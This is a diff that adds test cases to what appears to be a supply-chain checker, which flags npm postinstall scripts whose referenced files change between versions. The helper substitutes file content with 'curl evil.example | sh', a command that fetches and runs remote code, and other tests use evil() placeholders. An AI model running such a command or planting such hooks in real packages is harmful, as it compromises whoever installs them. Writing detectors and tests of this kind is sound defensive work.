@@ -1342,3 +1342,46 @@ describe("round 34: relative references after a cd", () => {
     expect(held({ postinstall: "cd lib; sh -c 'node setup.js'" }, { ...lib, "test/p.js": "1\n" }, { ...lib, "test/p.js": "evil()\n" })).toBe(true);
   });
 });
+
+describe("round 35: wrapped c-strings, parameters, long options after -c, cd then fed files", () => {
+  const changed = (cmd: string, f: string, extra: Record<string, string> = {}, o = "console.log(1)\n") => held({ postinstall: cmd }, { [f]: o, ...extra }, { [f]: "curl evil.example | sh\n", ...extra });
+
+  test("1. c-strings behind env and other wrappers", () => {
+    for (const cmd of ["env bash -c 'node test/x.js'", "/usr/bin/env bash -c 'node test/x.js'", "/usr/bin/env sh -c 'node test/x.js'", "env -i FOO=1 sh -c 'node test/x.js'", "nohup sh -c 'node test/x.js'", "sudo -u root bash -lc 'node test/x.js'", "timeout 5 sh -c 'node test/x.js'", "nice -n 5 bash -c 'node test/x.js'", "env sh -c 'node test/x.js' > /dev/null", "/bin/bash -c 'node test/x.js'"]) {
+      expect(changed(cmd, "test/x.js"), cmd).toBe(true);
+    }
+  });
+
+  test("2. the words after a c-string are parameters that may name files", () => {
+    for (const cmd of ["sh -c 'node \"$1\"' _ test/x.js", "bash -c 'node \"$1\"' _ test/x.js", "sh -c 'sh \"$0\"' test/x.js", "env sh -c 'node \"$1\"' _ test/x.js"]) {
+      expect(changed(cmd, "test/x.js"), cmd).toBe(true);
+    }
+  });
+
+  test("3. a double dash or a long option after -c", () => {
+    for (const cmd of ["bash -c -- 'node test/evil.js'", "bash -c --norc 'node test/evil.js'", "bash -c --posix -- 'node test/evil.js'"]) {
+      expect(changed(cmd, "test/evil.js"), cmd).toBe(true);
+    }
+  });
+
+  test("4. joined option values and rcfile forms", () => {
+    expect(changed("node --experimental-loader=./test/l.mjs x.js", "test/l.mjs", { "x.js": "1\n" })).toBe(true);
+    expect(changed("node --env-file=test/e.env x.js", "test/e.env", { "x.js": "1\n" })).toBe(true);
+    expect(changed("cd lib && bash --rcfile=rc.sh -i", "lib/rc.sh")).toBe(true);
+  });
+
+  test("5. a fed file after cd resolves from the new directory", () => {
+    const f = { "lib/a.sh": "node ../test/p.js\n" };
+    expect(held({ postinstall: "cd lib && sh < a.sh" }, { ...f, "test/p.js": "1\n" }, { ...f, "test/p.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: "cd lib && cat a.sh | sh" }, { ...f, "test/p.js": "1\n" }, { ...f, "test/p.js": "evil()\n" })).toBe(true);
+  });
+
+  test("6. a root script of the same name does not shadow the one in the cd directory", () => {
+    const f = { "build.sh": "echo root\n", "lib/build.sh": "node ../test/p.js\n" };
+    expect(held({ postinstall: "cd lib && sh build.sh" }, { ...f, "test/p.js": "1\n" }, { ...f, "test/p.js": "evil()\n" })).toBe(true);
+  });
+
+  test("7. an env assignment before a command (base behavior)", () => {
+    expect(held({ postinstall: "CI=1 node a.js; cd test && node setup.js" }, { "a.js": "1\n", "test/setup.js": "1\n" }, { "a.js": "1\n", "test/setup.js": "evil()\n" })).toBe(true);
+  });
+});
